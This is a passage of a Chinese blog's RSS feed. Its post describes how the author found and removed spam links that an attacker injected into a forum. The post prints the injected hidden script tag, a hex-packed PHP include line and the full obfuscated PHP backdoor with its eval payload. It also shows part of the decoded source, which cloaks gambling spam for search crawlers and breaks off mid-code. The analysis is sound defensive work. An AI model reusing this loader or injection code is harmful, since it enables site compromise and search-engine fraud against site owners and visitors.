<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>security - 看看俺 – KanKanAn.com</title>
        <description>记我所思，忆我所为。</description>
        <link>http://blog.kankanan.com/tag/security.xml</link>
        <lastBuildDate>Thu, 17 Dec 2015 03:57:53 GMT</lastBuildDate>
        <docs>http://blogs.law.harvard.edu/tech/rss</docs>
        <image>
            <title>security - 看看俺 – KanKanAn.com</title>
            <url>http://blog.kankanan.com/static/favicon.ico</url>
            <link>http://blog.kankanan.com/tag/security.xml</link>
        </image>
        <copyright>版权所有 © 2011-2015 看看俺 – KanKanAn.com</copyright>
        <generator>Feed for Node.js</generator>
        <category>技术</category>
        <item>
            <title><![CDATA[论坛被挂暗链问题分析与解决]]></title>
            <link>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</link>
            <guid>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</guid>
            <pubDate>Tue, 01 Apr 2014 13:38:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #f5871f;">div</span> <span style="color: #eab700;">style</span>='display:none'&gt;&lt;<span style="color: #f5871f;">script</span> <span style="color: #eab700;">language</span>='javascript' <span style="color: #eab700;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #eab700;">&amp;logo</span>=1' <span style="color: #eab700;">charset</span>='gb2312'&gt;&lt;/<span style="color: #f5871f;">script</span>&gt;&lt;/<span style="color: #f5871f;">div</span>&gt;&lt;<span style="color: #f5871f;">script</span> <span style="color: #eab700;">type</span>='text/javascript' <span style="color: #eab700;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #f5871f;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #718c00;">INCLUDE</span>(<span style="color: #4d4d4c; background-color: #ffffff;">pack(</span><span style="color: #3e999f;">'H*'</span>,<span style="color: #3e999f;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #8959a8;">&lt;?php</span> $<span style="color: #eab700;">O00OO0</span>=<span style="color: #4d4d4c; background-color: #ffffff;">urldecode(</span><span style="color: #3e999f;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #3e999f; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);$</span><span style="color: #eab700; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">6</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">30</span><span style="text-decoration: underline;">};$</span><span style="color: #eab700; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">24</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #eab700; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=$</span><span style="color: #eab700; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">18</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #eab700; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">7</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">13</span><span style="text-decoration: underline;">};$</span><span style="color: #eab700; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">22</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">36</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">29</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">30</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">32</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">35</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #eab700; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">30</span><span style="text-decoration: underline;">};</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">eval(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #3e999f; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #8959a8;">&lt;?php</span>
<span style="color: #8e908c; font-style: italic;">/*</span>
<span style="color: #8e908c; font-style: italic;">*author:whoami</span>
<span style="color: #8e908c; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #8e908c; font-style: italic;">*/</span>
<span style="color: #4d4d4c; background-color: #ffffff;">error_reporting(0</span>);
$<span style="color: #eab700;">fileDir</span> = <span style="color: #3e999f;">'/var/tmp/.SYSDUMP/'</span>;
$<span style="color: #eab700;">IP</span>=$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'REMOTE_ADDR'</span>];
$<span style="color: #eab700;">Bot</span>=$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'HTTP_USER_AGENT'</span>];
$<span style="color: #eab700;">Ref</span>=$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'HTTP_REFERER'</span>];
$<span style="color: #eab700;">KIP</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'117.28.255.37'</span>,<span style="color: #3e999f;">'116.55.241.24'</span>,<span style="color: #3e999f;">'125.64.94.219'</span>,<span style="color: #3e999f;">'119.147.114.213'</span>,<span style="color: #3e999f;">'11</span><span style="color: #3e999f; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #eab700;">KBot</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Baiduspider'</span>,<span style="color: #3e999f;">'Googlebot'</span>,<span style="color: #3e999f;">'Yahoo'</span>,<span style="color: #3e999f;">'Bingbot'</span>,<span style="color: #3e999f;">'Sosospider'</span>,<span style="color: #3e999f;">'Sogou'</span>,<span style="color: #3e999f;">'36</span><span style="color: #3e999f; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #eab700;">Key</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'anquan.org'</span>,<span style="color: #3e999f;">'google.com'</span>,<span style="color: #3e999f;">'soso.com'</span>,<span style="color: #3e999f;">'%e8%b5%8c'</span>,<span style="color: #3e999f;">'%e9%aa%b0'</span>,<span style="color: #3e999f;">'%e9%b1%</span><span style="color: #3e999f; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">dec0de</span>($<span style="color: #eab700;">fileDir</span>,$<span style="color: #eab700;">data</span>){
$<span style="color: #eab700;">dataArr</span> = <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">':'</span>,$<span style="color: #eab700;">data</span>);
